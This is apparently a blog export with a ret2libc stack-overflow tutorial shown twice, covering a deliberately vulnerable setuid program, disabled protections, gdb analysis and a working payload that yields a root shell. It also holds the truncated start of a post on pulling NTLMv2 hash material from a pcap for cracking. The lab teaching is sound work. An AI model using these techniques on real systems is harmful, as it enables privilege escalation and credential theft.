bytes to the address stored in the eax register. This results in the address of `argv[1]`. Next, `mov eax,DWORD PTR [eax]` takes the value at `argv[1]` and copies it into the `eax` register. `push eax` pushes this value onto the stack.\n\n       0x08048438 \u003c+34\u003e:\tlea    eax,[ebp-0x100]\n       0x0804843e \u003c+40\u003e:\tpush   eax\n    \n\n`lea eax,[ebp-0x100]` calculates the address of `ebp-0x100` and stores the address in `eax`. `push eax` pushes this address onto the stack.\n\n       0x0804843f \u003c+41\u003e:\tcall   0x80482e0 \u003cstrcpy@plt\u003e\n    \n\nThe `call` instruction does a couple of things. It pushes the address of the instruction immediately following the call instruction onto the stack and then does an unconditional jump to `strcpy@plt`. The reason a return address is pushed onto the stack is so that when `strcpy@plt` finishes executing, the program knows where to return execution.\n\n       0x08048444 \u003c+46\u003e:\tadd    esp,0x8\n       0x08048447 \u003c+49\u003e:\tmov    eax,0x0\n       0x0804844c \u003c+54\u003e:\tleave  \n       0x0804844d \u003c+55\u003e:\tret    \n    \n\nThese last four instructions are a function epilog. This is just the opposite of a function prologue. Instead of setting up the stack, the epilog cleans up the stack. `add esp,0x8` adds 8 bytes to the address `esp` points to. Then `mov eax,0x0` zeros out whatever is stored in the `eax` register. The `leave` instruction does a couple of things. It releases the stack frame and then copies the base pointer (`ebp`) into `esp`. This releases the space that was allocated to the previous stack frame. Finally, the `ret` instruction pops the return address off the stack and transfers returns execution to the address that was pop'd.\n\n# Exploiting the SOF vulnerability\n\nNow that we have disabled common BOP features and understand the assembler of our vulnerable binary, we will begin exploiting. One of the first things I like to do (after reviewing the assembler dump) is to verify that an overflow exists by triggering a segmentation fault. This is done by providing data to a program which in our case, get's strcpy'd into a fixed width buffer.\n\n    th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master \n    â  bin/sof $(perl -e 'print \"A\" x 260')\n    [1]    6406 segmentation fault (core dumped)  bin/sof $(perl -e 'print \"A\" x 260')\n    \n\nWhen we strcpy 260 'A' characters into the buffer, we get a segmentation fault. This is because we overwrote the four bytes of memory after the end of our buffer. Segmentation faults are exceptions that get raised by hardware with memory protection. It indicates that something tried writing to a region of memory it shouldn't have.\n\n## Creating the payload\n\nIn order to successfully call `system`, we need to place a few different values on the stack, when we overflow the buffer. We need the address of \"/bin/sh\" found in libc.so, an address that execution will return to when system has finished, and an address to the system call itself.\n\nTo get the address to '/bin/sh', we can calculate it by taking the starting address of libc.so and adding the offset of '/bin/sh' to it.\n\nTo see the absolute path to the libc.so library that our binary uses, we use `ldd`. This is needed for the next step.\n\n    th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master\n    â  ldd bin/sof\n    \tlinux-gate.so.1 (0xf7fd2000)\n    \tlibc.so.6 =\u003e /lib/libc.so.6 (0xf7deb000)\n    \t/lib/ld-linux.so.2 (0xf7fd4000)\n    \n    \n\nNext, we use `strings` to report the offset of any string it finds in libc.so and grep the output for what we're after.\n\n    th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master\n    â  strings -a -t x /lib/libc.so.6 | grep '/bin/sh'   \n     16a23e /bin/sh\n    \n\nRunning `vmmap` will also provide the starting address of libc.so when ran from a active gdb session.\n\n    th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master \n    â  gdb -q bin/sof\n    \n    @gefâ¤  vmmap\n    Start      End        Offset     Perm Path\n    0x08048000 0x08049000 0x00000000 r-x /home/th3v0id/repos/bufferoverflows/stack/01/bin/sof\n    0x08049000 0x0804a000 0x00000000 rwx /home/th3v0id/repos/bufferoverflows/stack/01/bin/sof\n    0xf7deb000 0xf7fa4000 0x00000000 r-x /usr/lib/libc-2.26.so\n    0xf7fa4000 0xf7fa5000 0x001b9000 --- /usr/lib/libc-2.26.so\n    0xf7fa5000 0xf7fa7000 0x001b9000 r-x /usr/lib/libc-2.26.so\n    0xf7fa7000 0xf7fa8000 0x001bb000 rwx /usr/lib/libc-2.26.so\n    0xf7fa8000 0xf7fab000 0x00000000 rwx \n    0xf7fcd000 0xf7fcf000 0x00000000 rwx \n    0xf7fcf000 0xf7fd2000 0x00000000 r-- [vvar]\n    0xf7fd2000 0xf7fd4000 0x00000000 r-x [vdso]\n    0xf7fd4000 0xf7ffc000 0x00000000 r-x /usr/lib/ld-2.26.so\n    0xf7ffc000 0xf7ffd000 0x00027000 r-x /usr/lib/ld-2.26.so\n    0xf7ffd000 0xf7ffe000 0x00028000 rwx /usr/lib/ld-2.26.so\n    0xfffda000 0xffffe000 0x00000000 rwx [stack]\n    \n    @gefâ¤  q\n    \n\nWe calculate the address by taking the start address of `/usr/lib/libc-2.26.so` and add the offset of the string. I like to use `printf` for this. If you use printf in gdb, you have to add `shell` before the command so gdb doesn't try to interpret it as one it provides. Same applies to any shell command you want to run in gdb.\n\n    th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master\n    â  printf \"0x%x\\n\" $((0xf7deb000 + 0x16a23e))  \n    0xf7f5523e\n    \n\nTo verify the address is correct, we can evaluate it in gdb, and see what string resides there. It should be '/bin/sh'.\n\n    @gefâ¤  x/s 0xf7f5523e\n    0xf7f5523e:\t\"/bin/sh\"\n    \n\nAnd now, we just need the address of `system`.\n\n    @gefâ¤  p system\n    $1 = {\u003ctext variable, no debug info\u003e} 0xf7e2c540 \u003c__libc_system\u003e\n    \n    @gefâ¤  q\n    \n\nBecause I'm on a machine with an Intel processor and I compiled the binary for 32 bit systems, the addresses we found need to be reversed to conform with little-endian notation. If you have a processor that enforces little-endian notation, you will find yourself doing this often. I wrote this [script](https://gist.github.com/selftaught/5ba8e942f68ae38719243de8d07bcaea) that takes a memory address and reverses it.\n\nReverse system address\n\n    th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master\n    â  raddr -a 0xf7e2c540\n    \\x40\\xc5\\xe2\\xf7\n    \n\nReverse \"/bin/sh\" string address\n\n    th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master\n    â  raddr -a 0xf7f5523e\n    \\x3e\\x52\\xf5\\xf7\n    \n\nAnd for the return address, we can use anything for the time being.\n\n    th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master \n    â   raddr -a 0xdeadc0de\n    \\xde\\xc0\\xad\\xd\n    \n\nWe modify the command we ran earlier, adding the reversed addresses onto the end of the payload.\n\n    #\n    # [      260 x \"A\" characters      ][  system() address  ][ random address ][ '/bin/sh' address ]\n    #\n    th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master\n    â  bin/sof $(perl -e 'print \"A\" x 260 . \"\\x40\\xc5\\xe2\\xf7\" . \"\\xde\\xc0\\xad\\xde\" . \"\\x3e\\x52\\xf5\\xf7\"')\n    @sh-4.4# whoami\n    root\n    @sh-4.4# exit\n    exit\n    [1]    9121 segmentation fault  bin/sof \n    \n\nWe successfully overflow the buffer, call system with '/bin/sh' as the first arg, and get a shell. This works even despite the fact that when we exit from the shell, we get a segmentation fault. There is a way to exit the shell cleanly without triggering a segfault. What we can do instead of using 0xdeadbeef for our return address is use the `exit` system call address instead. Doing so should give us a clean exit.\n\n    @gefâ¤  p exit\n    $2 = {\u003ctext variable, no debug info\u003e} 0xf7e1e8f0 \u003c__GI_exit\u003e\n    \n    @gefâ¤  q\n    \n\nReverse exit's address\n\n    th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master \n    â  raddr -a 0xf7e1e8f0 \n    \\xf0\\xe8\\xe1\\xf7\n    \n\nAnd now replace the invalid return address with it in our payload.\n\n    #\n    # [      260 x \"A\" characters      ][  system() address  ][ exit() address ][ '/bin/sh' address ]\n    #\n    th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master\n    â  bin/sof $(perl -e 'print \"A\" x 260 . \"\\x40\\xc5\\xe2\\xf7\" . \"\\xf0\\xe8\\xe1\\xf7\" . \"\\x3e\\x52\\xf5\\xf7\"')\n    @sh-4.4# whoami\n    root\n    @sh-4.4# exit\n    exit\n    th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master\n    â\n    \n\nAnd get a shell with a clean exit.\n\n## Brief overview of a few common buffer overflow protection mechanisms\n\n- \nASLR (Address Space Layout Randomization)\n\n- ASLR is a technique used to randomize the address space of programs when they start. This is done by giving program a random start address. This makes exploiting a buffer overflow more difficult because the addresses in the program become unreliable thus making it harder to consistently jump to any given address. Just like any other security mechanisms, ASLR only makes things more difficult. Not impossible.\n\n- \nCanary\n\n- Stack Canaries are used to catch stack overflows before malicious code is executed. These work by modifying function epilog and prologue regions on the stack. If a buffer is overwritten during execution, it's noticed, and results in an exception (hopefully) which bubbles up until it is caught by an exception handler. This is not always successful and there are methods for exploiting this. If you can successfully overwrite the exception handler on the stack (SEH), you can carry out your exploit, completely mitigating canaries.\n\n- \nRELRO (RELocation Read-Only)\n\n- RELRO protection makes the relocation sections that are used to resolve dynamically loaded functions, read-only. Essentially, what this means is that binaries get marked which tells the dynamic linker to resolve all symbols during the start up of a program when it's executed or when a shared library is linked to using dlopen instead of waiting to do resolution when a function is called.\n\n- \nNX bit (Non-executable bit)\n\n- Used to mark certain areas of memory as non-executable. Any processors that support the use of the NX bit will refuse to perform any write operations on marked segments of memory.\n\n- AMD uses the terminology \"Enhanced Virus Protection\" for the NX bit.\n- Intel refers to it as the \"XD (eXecute Disabled) bit.\"\n- ARM refers to it as the \"XN (eXecute Never) bit.\"\n\n## Further Reading\n\n- [BOF protection](https://en.wikipedia.org/wiki/Buffer_overflow_protection)\n- [Understanding Buffer Overflow Attacks](https://itandsecuritystuffs.wordpress.com/2014/03/18/understanding-buffer-overflows-attacks-part-1/)\n- [Stack - Abstract Data Type](https://en.wikipedia.org/wiki/Stack_(abstract_data_type))\n- [Smashing The Stack For Fun And Profit](http://insecure.org/stf/smashstack.html)\n- [0x00 sec](https://0x00sec.org/search?q=stack%20overflow)\n- [Black Hat - Difference between BOF preventions and weaknesses](https://www.blackhat.com/presentations/bh-usa-04/bh-us-04-silberman/bh-us-04-silberman-paper.pdf)\n- [Exploit Mitigation Techniques - DEP](https://0x00sec.org/t/exploit-mitigation-techniques-data-execution-prevention-dep/4634)\n- [Shellblade ret2libc](http://shellblade.net/docs/ret2libc.pdf)\n- [x64 ROP](https://0x00sec.org/t/64-bit-rop-you-rule-em-all/1937)\n- [UAF heap overflow](https://0x00sec.org/t/heap-exploitation-abusing-use-after-free/3580)\n- [NOP sled](https://www.exploit-db.com/papers/13171/)\n\n## Tools\n\n- [GEF - GDB Enhanced Features](https://github.com/hugsy/gef/)\n- [SMAP - Shellcode Mapper](https://github.com/rootlabs/smap/)\n- [Radare2](https://github.com/radare/radare2/)\n- [Cutter - Radare2 QT GUI](https://github.com/radareorg/cutter)\n- [MSFvenom](https://www.offensive-security.com/metasploit-unleashed/msfvenom/)\n- [pwntools](https://github.com/Gallopsled/pwntools)\n- [Unicorn - CPU emulator](http://www.unicorn-engine.org/)\n\n## Cheatsheets\n\n- [Memory Segmentation](https://i.imgur.com/Xe1m6C3.png)\n- [Reverse Engineering](https://i.imgur.com/ewrWkEa.png)\n- [radare2](https://github.com/radare/radare2/blob/master/doc/intro.md)\n\n## Other\n\n- [Shellcode Database](http://shell-storm.org/shellcode/)\n- [GDB documentation](https://sourceware.org/gdb/current/onlinedocs/gdb/)\n- [GEF documentation](http://gef.readthedocs.io/en/master/)\n- [Linux 32bit syscalls](http://asm.sourceforge.net/syscall.html)\n","cover":"2019/01/gef.jpg","author":{"name":"th3v0id","avatar":"avatars/th3v0id.jpg"},"content":"\nA stack buffer overflow occurs when a program writes to a memory address on it's call stack outside of the intended structure / space.\n\nIn this walk-through, I'm going to cover the ret2libc (return-to-libc) method. This method of exploitation is great because it doesn't require the use of your typical shellcode. It involves making sys calls to the functions provided to us by libc (standard c library). We're going to use the `system` and `exit` sys calls for demonstration.\n\nTo have a good understanding about how stack overflows work, it's extremely helpful to know how stack data structures work, and more importantly - how the call stack works. For the sake of time, I'm not going to type out how these two things work in great detail. If you want to know how these work, I would recommend watching [stack](https://www.youtube.com/watch?v=7dLZRMDcY6c) and [call stack](https://www.youtube.com/watch?v=XbZQ-EonR_I).\n\n## Creating a vulnerable binary to test on\n\nTo practice carrying out a SOF, we create a vulnerable binary. The source below uses strcpy with no boundary checking. This is what makes the code vulnerable to a stack overflow attack. strcpy() will take whatever is in argv[1] and copy it into buf. Without boundary checking around strcpy() to make sure the length of argv[1] isn't greater than the width of the buffer, we can overrun the buffer and overwrite assembler instructions with our own.\n\n    #include \u003cstring.h\u003e\n    #include \u003cunistd.h\u003e\n    #include \u003csys/cdefs.h\u003e\n    \n    int main(int argc, char** argv) {\n    \n        setuid(0);\n    \n        if (argc \u003e 1) {\n            char buf[256];\n            strcpy(buf, argv[1]);\n        }\n    \n        return 0;\n    }\n    \n\nFor the sake of simplicity and keeping this article to a sane length, I disable common buffer overflow protection (BOP) mechanisms including ASLR, Canaries, and NX bit. PIE and RelRO are disabled on my system by default. I also pass an option along to make the binary 32-bit.\n\n`gcc -g -Wall -mpreferred-stack-boundary=2 -fno-stack-protector -m32 -I. -z execstack -o bin/sof src/sof.c`\n\n- `-g`: Produces debugging information about the program that GDB (GNU Debugger) can use to aid us.\n- `-fno-stack-protector`: Disables stack smashing protectors (SSP).\n- `-z execstack`: Makes stack frames executable.\n- `-o sof`: Output (compiled) binary name will be sof.\n- `-mpreferred-stack-boundary=2`: aligns the stack boundary in our binary to 4 bytes.\n\nASLR can't be disabled via a compiler flag because it's a feature that's carried out and managed by the kernel. On Fedora, Debian, and Ubuntu, ASLR can be disabled by adding `kernel.randomize_va_space = 0` to `/etc/sysctl.conf` or `echo 0 \u003e /proc/sys/kernel/randomize_va_space`. Other linux distributions may require a different approach. An easy way to determine if ASLR is enabled (it likely is if you didn't expliclity disable it) is to `cat /proc/sys/kernel/randomize_va_space`. If the output is a positive number, it's enabled.\n\n## Assembler dump breakdown\n\nLet's disassemble the main function in our binary, break it down, and talk about what happens at an assembler level.\n\n    th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master \n    â  gdb -q \tbin/sof                                              \n    [*] No debugging session active\n    GEF for linux ready, type `gef' to start, `gef config' to configure\n    67 commands loaded for GDB Fedora 8.0.1-33.fc27 using Python engine 3.6\n    Reading symbols from bin/sof...done.\n    @gefâ¤  disassemble main\n    Dump of assembler code for function main:\n       0x08048416 \u003c+0\u003e:\tpush   ebp\n       0x08048417 \u003c+1\u003e:\tmov    ebp,esp\n       0x08048419 \u003c+3\u003e:\tsub    esp,0x100\n       0x0804841f \u003c+9\u003e:\tpush   0x0\n       0x08048421 \u003c+11\u003e:\tcall   0x8048300 \u003csetuid@plt\u003e\n       0x08048426 \u003c+16\u003e:\tadd    esp,0x4\n       0x08048429 \u003c+19\u003e:\tcmp    DWORD PTR [ebp+0x8],0x1\n       0x0804842d \u003c+23\u003e:\tjle    0x8048447 \u003cmain+49\u003e\n       0x0804842f \u003c+25\u003e:\tmov    eax,DWORD PTR [ebp+0xc]\n       0x08048432 \u003c+28\u003e:\tadd    eax,0x4\n       0x08048435 \u003c+31\u003e:\tmov    eax,DWORD PTR [eax]\n       0x08048437 \u003c+33\u003e:\tpush   eax\n       0x08048438 \u003c+34\u003e:\tlea    eax,[ebp-0x100]\n       0x0804843e \u003c+40\u003e:\tpush   eax\n       0x0804843f \u003c+41\u003e:\tcall   0x80482e0 \u003cstrcpy@plt\u003e\n       0x08048444 \u003c+46\u003e:\tadd    esp,0x8\n       0x08048447 \u003c+49\u003e:\tmov    eax,0x0\n       0x0804844c \u003c+54\u003e:\tleave  \n       0x0804844d \u003c+55\u003e:\tret    \n    End of assembler dump.\n    @gefâ¤  q\n    \n\n       0x08048416 \u003c+0\u003e:\tpush   ebp\n       0x08048417 \u003c+1\u003e:\tmov    ebp,esp\n       0x08048419 \u003c+3\u003e:\tsub    esp,0x100\n    \n\nThese first few lines above are called a function prologue. `push ebp` pushes our base pointer onto the stack. Then `mov ebp,esp` copies the value of `esp` (stack pointer) into the `ebp` register making `ebp` == `esp`. Next, `sub esp,0x100` moves the stack pointer 256 bytes (0x100 hex = 256) towards a lower memory address, reserving 256 bytes of data on the stack. This is space being reserved for `char buf[256]`.\n\n       0x0804841f \u003c+9\u003e:\tpush   0x0\n       0x08048421 \u003c+11\u003e:\tcall   0x8048300 \u003csetuid@plt\u003e\n    \n\nPush 0 onto the stack as an argument for the call to `setuid()`.\n\n       0x08048426 \u003c+16\u003e:\tadd    esp,0x4\n       0x08048429 \u003c+19\u003e:\tcmp    DWORD PTR [ebp+0x8],0x1\n       0x0804842d \u003c+23\u003e:\tjle    0x8048447 \u003cmain+49\u003e\n    \n\nThe next instruction `cmp DWORD PTR [ebp+0x8],0x1` compares the first argument of main (argc) to 1. The following `jle` instruction uses the result of this comparison. It takes the result and jumps to `\u003cmain+39\u003e` if the result is less than or equal to the value stored at `0x8048412`, which is 1. If you look at the C source above, you can see this is essentially our `if (argc \u003e) {...}` condition.\n\n       0x0804842f \u003c+25\u003e:\tmov    eax,DWORD PTR [ebp+0xc]\n       0x08048432 \u003c+28\u003e:\tadd    eax,0x4\n       0x08048435 \u003c+31\u003e:\tmov    eax,DWORD PTR [eax]\n       0x08048437 \u003c+33\u003e:\tpush   eax\n    \n\nHere, we move the address stored at ebp+0xc into the eax register (this is the address to element 0 of argv). Then, we add 4 bytes to the address stored in the eax register. This results in the address of `argv[1]`. Next, `mov eax,DWORD PTR [eax]` takes the value at `argv[1]` and copies it into the `eax` register. `push eax` pushes this value onto the stack.\n\n       0x08048438 \u003c+34\u003e:\tlea    eax,[ebp-0x100]\n       0x0804843e \u003c+40\u003e:\tpush   eax\n    \n\n`lea eax,[ebp-0x100]` calculates the address of `ebp-0x100` and stores the address in `eax`. `push eax` pushes this address onto the stack.\n\n       0x0804843f \u003c+41\u003e:\tcall   0x80482e0 \u003cstrcpy@plt\u003e\n    \n\nThe `call` instruction does a couple of things. It pushes the address of the instruction immediately following the call instruction onto the stack and then does an unconditional jump to `strcpy@plt`. The reason a return address is pushed onto the stack is so that when `strcpy@plt` finishes executing, the program knows where to return execution.\n\n       0x08048444 \u003c+46\u003e:\tadd    esp,0x8\n       0x08048447 \u003c+49\u003e:\tmov    eax,0x0\n       0x0804844c \u003c+54\u003e:\tleave  \n       0x0804844d \u003c+55\u003e:\tret    \n    \n\nThese last four instructions are a function epilog. This is just the opposite of a function prologue. Instead of setting up the stack, the epilog cleans up the stack. `add esp,0x8` adds 8 bytes to the address `esp` points to. Then `mov eax,0x0` zeros out whatever is stored in the `eax` register. The `leave` instruction does a couple of things. It releases the stack frame and then copies the base pointer (`ebp`) into `esp`. This releases the space that was allocated to the previous stack frame. Finally, the `ret` instruction pops the return address off the stack and transfers returns execution to the address that was pop'd.\n\n# Exploiting the SOF vulnerability\n\nNow that we have disabled common BOP features and understand the assembler of our vulnerable binary, we will begin exploiting. One of the first things I like to do (after reviewing the assembler dump) is to verify that an overflow exists by triggering a segmentation fault. This is done by providing data to a program which in our case, get's strcpy'd into a fixed width buffer.\n\n    th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master \n    â  bin/sof $(perl -e 'print \"A\" x 260')\n    [1]    6406 segmentation fault (core dumped)  bin/sof $(perl -e 'print \"A\" x 260')\n    \n\nWhen we strcpy 260 'A' characters into the buffer, we get a segmentation fault. This is because we overwrote the four bytes of memory after the end of our buffer. Segmentation faults are exceptions that get raised by hardware with memory protection. It indicates that something tried writing to a region of memory it shouldn't have.\n\n## Creating the payload\n\nIn order to successfully call `system`, we need to place a few different values on the stack, when we overflow the buffer. We need the address of \"/bin/sh\" found in libc.so, an address that execution will return to when system has finished, and an address to the system call itself.\n\nTo get the address to '/bin/sh', we can calculate it by taking the starting address of libc.so and adding the offset of '/bin/sh' to it.\n\nTo see the absolute path to the libc.so library that our binary uses, we use `ldd`. This is needed for the next step.\n\n    th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master\n    â  ldd bin/sof\n    \tlinux-gate.so.1 (0xf7fd2000)\n    \tlibc.so.6 =\u003e /lib/libc.so.6 (0xf7deb000)\n    \t/lib/ld-linux.so.2 (0xf7fd4000)\n    \n    \n\nNext, we use `strings` to report the offset of any string it finds in libc.so and grep the output for what we're after.\n\n    th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master\n    â  strings -a -t x /lib/libc.so.6 | grep '/bin/sh'   \n     16a23e /bin/sh\n    \n\nRunning `vmmap` will also provide the starting address of libc.so when ran from a active gdb session.\n\n    th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master \n    â  gdb -q bin/sof\n    \n    @gefâ¤  vmmap\n    Start      End        Offset     Perm Path\n    0x08048000 0x08049000 0x00000000 r-x /home/th3v0id/repos/bufferoverflows/stack/01/bin/sof\n    0x08049000 0x0804a000 0x00000000 rwx /home/th3v0id/repos/bufferoverflows/stack/01/bin/sof\n    0xf7deb000 0xf7fa4000 0x00000000 r-x /usr/lib/libc-2.26.so\n    0xf7fa4000 0xf7fa5000 0x001b9000 --- /usr/lib/libc-2.26.so\n    0xf7fa5000 0xf7fa7000 0x001b9000 r-x /usr/lib/libc-2.26.so\n    0xf7fa7000 0xf7fa8000 0x001bb000 rwx /usr/lib/libc-2.26.so\n    0xf7fa8000 0xf7fab000 0x00000000 rwx \n    0xf7fcd000 0xf7fcf000 0x00000000 rwx \n    0xf7fcf000 0xf7fd2000 0x00000000 r-- [vvar]\n    0xf7fd2000 0xf7fd4000 0x00000000 r-x [vdso]\n    0xf7fd4000 0xf7ffc000 0x00000000 r-x /usr/lib/ld-2.26.so\n    0xf7ffc000 0xf7ffd000 0x00027000 r-x /usr/lib/ld-2.26.so\n    0xf7ffd000 0xf7ffe000 0x00028000 rwx /usr/lib/ld-2.26.so\n    0xfffda000 0xffffe000 0x00000000 rwx [stack]\n    \n    @gefâ¤  q\n    \n\nWe calculate the address by taking the start address of `/usr/lib/libc-2.26.so` and add the offset of the string. I like to use `printf` for this. If you use printf in gdb, you have to add `shell` before the command so gdb doesn't try to interpret it as one it provides. Same applies to any shell command you want to run in gdb.\n\n    th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master\n    â  printf \"0x%x\\n\" $((0xf7deb000 + 0x16a23e))  \n    0xf7f5523e\n    \n\nTo verify the address is correct, we can evaluate it in gdb, and see what string resides there. It should be '/bin/sh'.\n\n    @gefâ¤  x/s 0xf7f5523e\n    0xf7f5523e:\t\"/bin/sh\"\n    \n\nAnd now, we just need the address of `system`.\n\n    @gefâ¤  p system\n    $1 = {\u003ctext variable, no debug info\u003e} 0xf7e2c540 \u003c__libc_system\u003e\n    \n    @gefâ¤  q\n    \n\nBecause I'm on a machine with an Intel processor and I compiled the binary for 32 bit systems, the addresses we found need to be reversed to conform with little-endian notation. If you have a processor that enforces little-endian notation, you will find yourself doing this often. I wrote this [script](https://gist.github.com/selftaught/5ba8e942f68ae38719243de8d07bcaea) that takes a memory address and reverses it.\n\nReverse system address\n\n    th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master\n    â  raddr -a 0xf7e2c540\n    \\x40\\xc5\\xe2\\xf7\n    \n\nReverse \"/bin/sh\" string address\n\n    th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master\n    â  raddr -a 0xf7f5523e\n    \\x3e\\x52\\xf5\\xf7\n    \n\nAnd for the return address, we can use anything for the time being.\n\n    th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master \n    â   raddr -a 0xdeadc0de\n    \\xde\\xc0\\xad\\xd\n    \n\nWe modify the command we ran earlier, adding the reversed addresses onto the end of the payload.\n\n    #\n    # [      260 x \"A\" characters      ][  system() address  ][ random address ][ '/bin/sh' address ]\n    #\n    th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master\n    â  bin/sof $(perl -e 'print \"A\" x 260 . \"\\x40\\xc5\\xe2\\xf7\" . \"\\xde\\xc0\\xad\\xde\" . \"\\x3e\\x52\\xf5\\xf7\"')\n    @sh-4.4# whoami\n    root\n    @sh-4.4# exit\n    exit\n    [1]    9121 segmentation fault  bin/sof \n    \n\nWe successfully overflow the buffer, call system with '/bin/sh' as the first arg, and get a shell. This works even despite the fact that when we exit from the shell, we get a segmentation fault. There is a way to exit the shell cleanly without triggering a segfault. What we can do instead of using 0xdeadbeef for our return address is use the `exit` system call address instead. Doing so should give us a clean exit.\n\n    @gefâ¤  p exit\n    $2 = {\u003ctext variable, no debug info\u003e} 0xf7e1e8f0 \u003c__GI_exit\u003e\n    \n    @gefâ¤  q\n    \n\nReverse exit's address\n\n    th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master \n    â  raddr -a 0xf7e1e8f0 \n    \\xf0\\xe8\\xe1\\xf7\n    \n\nAnd now replace the invalid return address with it in our payload.\n\n    #\n    # [      260 x \"A\" characters      ][  system() address  ][ exit() address ][ '/bin/sh' address ]\n    #\n    th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master\n    â  bin/sof $(perl -e 'print \"A\" x 260 . \"\\x40\\xc5\\xe2\\xf7\" . \"\\xf0\\xe8\\xe1\\xf7\" . \"\\x3e\\x52\\xf5\\xf7\"')\n    @sh-4.4# whoami\n    root\n    @sh-4.4# exit\n    exit\n    th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master\n    â\n    \n\nAnd get a shell with a clean exit.\n\n## Brief overview of a few common buffer overflow protection mechanisms\n\n- \nASLR (Address Space Layout Randomization)\n\n- ASLR is a technique used to randomize the address space of programs when they start. This is done by giving program a random start address. This makes exploiting a buffer overflow more difficult because the addresses in the program become unreliable thus making it harder to consistently jump to any given address. Just like any other security mechanisms, ASLR only makes things more difficult. Not impossible.\n\n- \nCanary\n\n- Stack Canaries are used to catch stack overflows before malicious code is executed. These work by modifying function epilog and prologue regions on the stack. If a buffer is overwritten during execution, it's noticed, and results in an exception (hopefully) which bubbles up until it is caught by an exception handler. This is not always successful and there are methods for exploiting this. If you can successfully overwrite the exception handler on the stack (SEH), you can carry out your exploit, completely mitigating canaries.\n\n- \nRELRO (RELocation Read-Only)\n\n- RELRO protection makes the relocation sections that are used to resolve dynamically loaded functions, read-only. Essentially, what this means is that binaries get marked which tells the dynamic linker to resolve all symbols during the start up of a program when it's executed or when a shared library is linked to using dlopen instead of waiting to do resolution when a function is called.\n\n- \nNX bit (Non-executable bit)\n\n- Used to mark certain areas of memory as non-executable. Any processors that support the use of the NX bit will refuse to perform any write operations on marked segments of memory.\n\n- AMD uses the terminology \"Enhanced Virus Protection\" for the NX bit.\n- Intel refers to it as the \"XD (eXecute Disabled) bit.\"\n- ARM refers to it as the \"XN (eXecute Never) bit.\"\n\n## Further Reading\n\n- [BOF protection](https://en.wikipedia.org/wiki/Buffer_overflow_protection)\n- [Understanding Buffer Overflow Attacks](https://itandsecuritystuffs.wordpress.com/2014/03/18/understanding-buffer-overflows-attacks-part-1/)\n- [Stack - Abstract Data Type](https://en.wikipedia.org/wiki/Stack_(abstract_data_type))\n- [Smashing The Stack For Fun And Profit](http://insecure.org/stf/smashstack.html)\n- [0x00 sec](https://0x00sec.org/search?q=stack%20overflow)\n- [Black Hat - Difference between BOF preventions and weaknesses](https://www.blackhat.com/presentations/bh-usa-04/bh-us-04-silberman/bh-us-04-silberman-paper.pdf)\n- [Exploit Mitigation Techniques - DEP](https://0x00sec.org/t/exploit-mitigation-techniques-data-execution-prevention-dep/4634)\n- [Shellblade ret2libc](http://shellblade.net/docs/ret2libc.pdf)\n- [x64 ROP](https://0x00sec.org/t/64-bit-rop-you-rule-em-all/1937)\n- [UAF heap overflow](https://0x00sec.org/t/heap-exploitation-abusing-use-after-free/3580)\n- [NOP sled](https://www.exploit-db.com/papers/13171/)\n\n## Tools\n\n- [GEF - GDB Enhanced Features](https://github.com/hugsy/gef/)\n- [SMAP - Shellcode Mapper](https://github.com/rootlabs/smap/)\n- [Radare2](https://github.com/radare/radare2/)\n- [Cutter - Radare2 QT GUI](https://github.com/radareorg/cutter)\n- [MSFvenom](https://www.offensive-security.com/metasploit-unleashed/msfvenom/)\n- [pwntools](https://github.com/Gallopsled/pwntools)\n- [Unicorn - CPU emulator](http://www.unicorn-engine.org/)\n\n## Cheatsheets\n\n- [Memory Segmentation](https://i.imgur.com/Xe1m6C3.png)\n- [Reverse Engineering](https://i.imgur.com/ewrWkEa.png)\n- [radare2](https://github.com/radare/radare2/blob/master/doc/intro.md)\n\n## Other\n\n- [Shellcode Database](http://shell-storm.org/shellcode/)\n- [GDB documentation](https://sourceware.org/gdb/current/onlinedocs/gdb/)\n- [GEF documentation](http://gef.readthedocs.io/en/master/)\n- [Linux 32bit syscalls](http://asm.sourceforge.net/syscall.html)\n"},{"title":"A 9-step recipe to crack a NTLMv2 Hash from a freshly acquired .pcap","slug":"cracking-an-ntlmv2-hash","date_published":1545170400000,"date_updated":1545177514000,"tags":["how to","pcap"],"excerpt":"\n1. Open your .pcap that contains an NTLMv2 hash in Wireshark.\n2. Filter by ntlmssp to get the authentication handshake.\n\n![](2018/12/image-3.jpg \"artisanal smb2 authentication packets\")\n\n3. In this case, we get three packets. Find the NTLMSSP_AUTH packet. Filter the packet down to the Security Blob layer to get to the juicy good stuff:\n\n![](2018/12/image-5.png \"the goods\")\n\n4. Copy out the domain name and user name to a text document.\n\n5. Drill down into the NTLM Response section to find NTProofStr and NTLMv2 response. Copy both of these out to the text document as a Hex String. \n\n![](2018/12/image-6.jpg \"cross the streams\")\n\n6. Notice that NTLMv2Response begins with the ntlmProofStr, so delete the ntlmProofStr from the NTLMv2Response.\n\n![](2018/12/image-7.jpg)\n\n7. Enter ntlmssp.ntlmserverchallenge into the search filter. This will highlight the packet where the NTLM Server Challenge is found, generally the packet before the NTLM_Auth packet. Copy this value to the text document as a Hex String. \n\n![](2018/12/image-8.jpg)\n\n8. Put the values into the following format and save it as crackme.txt: 